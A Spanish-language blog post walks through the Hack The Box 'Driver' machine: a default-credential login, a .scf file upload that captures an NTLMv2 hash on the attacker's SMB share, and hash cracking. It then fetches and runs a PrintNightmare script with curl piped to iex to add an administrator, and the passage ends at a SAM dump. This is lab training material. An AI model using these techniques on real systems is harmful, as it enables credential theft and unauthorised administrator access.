<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackTheBox - Driver (easy) | MiguelRega7 - blog</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="HackTheBox - Driver (easy)" />
<meta name="author" content="MiguelRega7" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Posts sobre resolucion de CTFs y ciberseguridad." />
<meta property="og:description" content="Posts sobre resolucion de CTFs y ciberseguridad." />
<link rel="canonical" href="http://localhost:4000/hackthebox/machines/easy/2024/04/07/driver.html" />
<meta property="og:url" content="http://localhost:4000/hackthebox/machines/easy/2024/04/07/driver.html" />
<meta property="og:site_name" content="MiguelRega7 - blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-04-07T00:00:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HackTheBox - Driver (easy)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-04-07T00:00:00-06:00","datePublished":"2024-04-07T00:00:00-06:00","description":"Posts sobre resolucion de CTFs y ciberseguridad.","headline":"HackTheBox - Driver (easy)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/easy/2024/04/07/driver.html"},"url":"http://localhost:4000/hackthebox/machines/easy/2024/04/07/driver.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Driver (easy)</h1>
    <p class="post-meta"><time class="dt-published" datetime="2024-04-07T00:00:00-06:00" itemprop="datePublished">
        Apr 7, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/ce42ce9fd28d117b8d6c045aefeb5cdb.png" />
</p>

<ul>
  <li>En este post vamos a estar haciendo la maquina Driver de la plataforma de Hack The Box después de usar credenciales por defecto en el servicio web podremos subir un archivo .scf para robar el hash ntlmv2 del usuario que esta por detrás revisando todo lo que suben, una vez crackeado el hash nos conectaremos con evil-winrm y para la escalada de privilegios explotaremos una vulnerabilidad que abusa de un printer driver que esta en la maquina victima y podremos agregar un usuario al grupo Administrators.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos con el escaneo de puertos abiertos y sus servicios para ver las tecnologías que están empleando.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,135,445,5985 10.129.250.229 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-02 19:06 CST
Nmap scan report <span class="k">for </span>10.129.250.229
Host is up <span class="o">(</span>0.51s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
| http-auth:
| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D
|_  Basic <span class="nv">realm</span><span class="o">=</span>MFP Firmware Update Center. Please enter password <span class="k">for </span>admin
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time:
|   date: 2024-04-03T08:06:49
|_  start_date: 2024-04-03T08:01:21
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
</span></code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Tenemos el puerto <strong>80</strong> abierto al parecer nos redirige a una pagina de <code class="language-plaintext highlighter-rouge">login</code> ya que en el escaneo nos da un <strong>401 Unauthorized</strong>.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">250.229</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">250.229</span> <span class="p">[</span><span class="mi">401</span> <span class="no">Unauthorized</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">250.229</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">PHP</span><span class="p">[</span><span class="mf">7.3</span><span class="o">.</span><span class="mi">25</span><span class="p">],</span> <span class="no">WWW</span><span class="o">-</span><span class="no">Authenticate</span><span class="p">[</span><span class="no">MFP</span> <span class="no">Firmware</span> <span class="no">Update</span> <span class="no">Center</span><span class="o">.</span> <span class="no">Please</span> <span class="n">enter</span> <span class="n">password</span> <span class="k">for</span> <span class="n">admin</span><span class="p">][</span><span class="no">Basic</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">PHP</span><span class="o">/</span><span class="mf">7.3</span><span class="o">.</span><span class="mi">25</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Esta es la web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/driver/1.png" />
</p>

<ul>
  <li>Si probamos con credenciales por defecto como <code class="language-plaintext highlighter-rouge">admin:admin</code> vemos que podemos entrar.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/driver/2.png" />
</p>

<h2 id="shell-as-tony">Shell as tony</h2>

<ul>
  <li>Si nos vamos al apartado de <strong>Firmware Updates</strong> vemos que podemos subir archivos y alguien lo va revisar ya con que nos digan eso podemos hacer un ataque para robar su <code class="language-plaintext highlighter-rouge">hash NTLMv2</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/driver/3.png" />
</p>

<ul>
  <li>La mayoría de veces cuando puedes subir un archivo para robar un hash NTLMv2 es subir un <code class="language-plaintext highlighter-rouge">.scf</code> que este archivo hace referencia a un <code class="language-plaintext highlighter-rouge">icon</code> en un <code class="language-plaintext highlighter-rouge">SMB share</code> cuando un usuario abre la carpeta desde el Explorador de archivos intenta conectarse de vuelta para obtener un archivo de icono desde nuestro recurso compartido SMB gracias a esto obtendremos el hash de la victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>icon.scf
<span class="o">[</span>Shell]
<span class="nv">IconFile</span><span class="o">=</span><span class="se">\\</span>10.10.14.19<span class="se">\z</span>i<span class="se">\d</span>ame.ico
</code></pre></div></div>

<ul>
  <li>Ahora ejecutamos el <code class="language-plaintext highlighter-rouge">impacket-smbserver</code> para ofrecer el recurso compartido y allí nos llegue el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbserver zi <span class="nb">.</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<ul>
  <li>Ahora subimos el archivo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/driver/4.png" />
</p>

<ul>
  <li>Al subirlo nos llega el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbserver zi <span class="nb">.</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.129.250.229,49414<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>DRIVER<span class="se">\t</span>ony,DRIVER<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User DRIVER<span class="se">\t</span>ony authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> tony::DRIVER:aaaaaaaaaaaaaaaa:23bb0f7e862bb961d0a9575629a94420:010100000000000080a35aa66585da013f8e51d6f6f0512e00000000010010004f0046005a004a006a00480067004700030010004f0046005a004a006a00480067004700020010006500780041004500480047006e006d00040010006500780041004500480047006e006d000700080080a35aa66585da01060004000200000008003000300000000000000000000000002000002d6d666541de235278af71556e18b8f6cca24e3bc26bbfa175e94480b52e4e710a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003900000000000000000000000000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:zi<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>2:zi<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.129.250.229,49414<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
</code></pre></div></div>

<ul>
  <li>Ahora simplemente crackeamos el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
liltony          <span class="o">(</span>tony<span class="o">)</span>
1g 0:00:00:00 DONE <span class="o">(</span>2024-04-02 19:25<span class="o">)</span> 8.333g/s 264533p/s 264533c/s 264533C/s <span class="o">!!!!!!</span>..225566
Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Verificamos que son correctas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.250.229 <span class="nt">-u</span> <span class="s1">'tony'</span> <span class="nt">-p</span> <span class="s1">'liltony'</span>
SMB         10.129.250.229  445    DRIVER           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Enterprise 10240 x64 <span class="o">(</span>name:DRIVER<span class="o">)</span> <span class="o">(</span>domain:DRIVER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         10.129.250.229  445    DRIVER           <span class="o">[</span>+] DRIVER<span class="se">\t</span>ony:liltony
</code></pre></div></div>

<ul>
  <li>Como tenemos el puerto de <code class="language-plaintext highlighter-rouge">smb</code> abierto podemos comprobar si tenemos acceso de escritura o del algún otro recurso compartido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.250.229 <span class="nt">-u</span> <span class="s1">'tony'</span> <span class="nt">-p</span> <span class="s1">'liltony'</span> <span class="nt">--shares</span>
SMB         10.129.250.229  445    DRIVER           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Enterprise 10240 x64 <span class="o">(</span>name:DRIVER<span class="o">)</span> <span class="o">(</span>domain:DRIVER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         10.129.250.229  445    DRIVER           <span class="o">[</span>+] DRIVER<span class="se">\t</span>ony:liltony
SMB         10.129.250.229  445    DRIVER           <span class="o">[</span>+] Enumerated shares
SMB         10.129.250.229  445    DRIVER           Share           Permissions     Remark
SMB         10.129.250.229  445    DRIVER           <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.129.250.229  445    DRIVER           ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.129.250.229  445    DRIVER           C<span class="nv">$ </span>                             Default share
SMB         10.129.250.229  445    DRIVER           IPC<span class="nv">$ </span>                           Remote IPC
</code></pre></div></div>

<ul>
  <li>Pero no tenemos nada interesante algo que podemos hacer es ver si el usuario forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code> para usar <code class="language-plaintext highlighter-rouge">evil-winrm</code> y conectarnos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.129.250.229 <span class="nt">-u</span> <span class="s1">'tony'</span> <span class="nt">-p</span> <span class="s1">'liltony'</span>
SMB         10.129.250.229  5985   DRIVER           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 10240 <span class="o">(</span>name:DRIVER<span class="o">)</span> <span class="o">(</span>domain:DRIVER<span class="o">)</span>
HTTP        10.129.250.229  5985   DRIVER           <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.250.229:5985/wsman
WINRM       10.129.250.229  5985   DRIVER           <span class="o">[</span>+] DRIVER<span class="se">\t</span>ony:liltony <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Y bueno podemos conectarnos y leer la <code class="language-plaintext highlighter-rouge">user flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.250.229 <span class="nt">-u</span> tony <span class="nt">-p</span> liltony

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>driver<span class="se">\t</span>ony
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
3bc6aa3a19aa59e9524f16993158ab66
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>
    <p>Para enumerar el sistema podemos subir winPEASx64 <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20240331-d41b024f">https://github.com/carlospolop/PEASS-ng/releases/tag/20240331-d41b024f</a>.</p>
  </li>
  <li>
    <p>Y lo subimos ala maquina.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; upload winPEASx64.exe

Info: Uploading /home/miguel/Hackthebox/Driver/content/winPEASx64.exe to C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments<span class="se">\w</span>inPEASx64.exe

Data: 3183272 bytes of 3183272 bytes copied

Info: Upload successful!
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Lo mas interesante de todo lo que nos reporto el script fue el historial de <code class="language-plaintext highlighter-rouge">Powershell</code> del usuario con el que estamos y encontramos que ejecuta 3 comandos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\u</span>sers<span class="se">\t</span>ony<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadLine<span class="se">\C</span>onsoleHost_history.txt
Add-Printer <span class="nt">-PrinterName</span> <span class="s2">"RICOH_PCL6"</span> <span class="nt">-DriverName</span> <span class="s1">'RICOH PCL6 UniversalDriver V4.23'</span> <span class="nt">-PortName</span> <span class="s1">'lpt1:'</span>

ping 1.1.1.1
ping 1.1.1.1
</code></pre></div></div>

<ul>
  <li>Vemos que en el primero comando lo que esta intenta hacer es añadir una impresora, si buscamos vulnerabilidades para eso encontramos el siguiente <a href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a> que lo que hace es que podemos crear un usuario Administrador donde nosotros indicamos el usuario y la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cloning into <span class="s1">'CVE-2021-1675'</span>...
remote: Enumerating objects: 40, <span class="k">done</span><span class="nb">.</span>
remote: Counting objects: 100% <span class="o">(</span>3/3<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Compressing objects: 100% <span class="o">(</span>2/2<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Total 40 <span class="o">(</span>delta 1<span class="o">)</span>, reused 1 <span class="o">(</span>delta 1<span class="o">)</span>, pack-reused 37
Receiving objects: 100% <span class="o">(</span>40/40<span class="o">)</span>, 127.17 KiB | 458.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>9/9<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
➜  content <span class="nb">cd </span>CVE-2021-1675
➜  CVE-2021-1675 git:<span class="o">(</span>main<span class="o">)</span> <span class="nb">ls
</span>CVE-2021-1675.ps1  README.md  nightmare-dll
</code></pre></div></div>

<ul>
  <li>Ahora lo subimos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; upload CVE-2021-1675.ps1

Info: Uploading /home/miguel/Hackthebox/Driver/content/CVE-2021-1675.ps1 to C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments<span class="se">\C</span>VE-2021-1675.ps1

Error: Upload failed. Check filenames or paths: No such file or directory - No such file or directory /home/miguel/Hackthebox/Driver/content/CVE-2021-1675.ps1
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; upload CVE-2021-1675.ps1

Info: Uploading /home/miguel/Hackthebox/Driver/content/CVE-2021-1675.ps1 to C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments<span class="se">\C</span>VE-2021-1675.ps1

Data: 238080 bytes of 238080 bytes copied

Info: Upload successful!
</code></pre></div></div>

<ul>
  <li>Si importamos el modulo vemos que no podemos por una política definida en el sistema.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
File C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments<span class="se">\C</span>VE-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID<span class="o">=</span>135170.
At line:1 char:1
+ Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: <span class="o">(</span>:<span class="o">)</span> <span class="o">[</span>Import-Module], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
</code></pre></div></div>

<ul>
  <li>Vamos a subirlo de otra forma.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>Lo que podemos hacer es descargarlo con <code class="language-plaintext highlighter-rouge">curl</code> y usar <code class="language-plaintext highlighter-rouge">iex</code> o <code class="language-plaintext highlighter-rouge">Invoke-Expression</code> además de usar el parámetro <code class="language-plaintext highlighter-rouge">-UseBasicParsing</code> que se utiliza con el <code class="language-plaintext highlighter-rouge">cmdlet</code> <code class="language-plaintext highlighter-rouge">Invoke-WebReques</code>t en <code class="language-plaintext highlighter-rouge">Porwershell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; curl 10.10.14.19:80/CVE-2021-1675.ps1 <span class="nt">-UseBasicParsing</span> | iex
</code></pre></div></div>

<ul>
  <li>Ahora vamos añadir nuestro usuario <code class="language-plaintext highlighter-rouge">Administrador</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; Invoke-Nightmare <span class="nt">-NewUser</span> migue
lito <span class="nt">-NewPassword</span> miguel123
<span class="o">[</span>+] created payload at C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\n</span>ightmare.dll
<span class="o">[</span>+] using pDriverPath <span class="o">=</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\D</span><span class="s2">riverStore</span><span class="se">\F</span><span class="s2">ileRepository</span><span class="se">\n</span><span class="s2">tprint.inf_amd64_f66d9eed7e835e97</span><span class="se">\A</span><span class="s2">md64</span><span class="se">\m</span><span class="s2">xdwdrv.dll"</span>
<span class="o">[</span>+] added user miguelito as <span class="nb">local </span>administrator
<span class="o">[</span>+] deleting payload from C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\n</span>ightmare.dll
</code></pre></div></div>

<ul>
  <li>Ahora comprobamos que el usuario forme parte del grupo <code class="language-plaintext highlighter-rouge">Administrators</code> para poder conectarnos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; net user miguelito
User name                    miguelito
Full Name                    miguelito
Comment
User<span class="s1">'s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/3/2024 2:06:36 AM
Password expires             Never
Password changeable          4/3/2024 2:06:36 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
</span></code></pre></div></div>

<ul>
  <li>Ahora comprobamos con <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.250.229 <span class="nt">-u</span> miguelito <span class="nt">-p</span> miguel123
SMB         10.129.250.229  445    DRIVER           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Enterprise 10240 x64 <span class="o">(</span>name:DRIVER<span class="o">)</span> <span class="o">(</span>domain:DRIVER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         10.129.250.229  445    DRIVER           <span class="o">[</span>+] DRIVER<span class="se">\m</span>iguelito:miguel123 <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<h2 id="shell-as-administrator-and-root-flag">Shell as Administrator and root flag</h2>

<ul>
  <li>Ahora ya simplemente nos conectamos y podemos leer la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.250.229 <span class="nt">-u</span> miguelito <span class="nt">-p</span> miguel123

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>iguelito<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
fce5289973391fd96a5db6dc2301f1cd
</code></pre></div></div>

<ul>
  <li>En caso de que queramos conectarnos como el usuario <strong>Administrator</strong> simplemente podemos <code class="language-plaintext highlighter-rouge">dumpear</code> la <code class="language-plaintext highlighter-rouge">sam</code> y ver los hashes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.250.229 <span class="nt">-u</span> miguelito <span class="nt">-p</span> miguel123 <span class="nt">--sam</span>
SMB         10.129.250.229  445    DRIVER           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Enterprise 10240 x64 <span class="o">(</span>name:DRIVER<span class="o">)</span> <span class="o">(</span>domain:DRIVER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
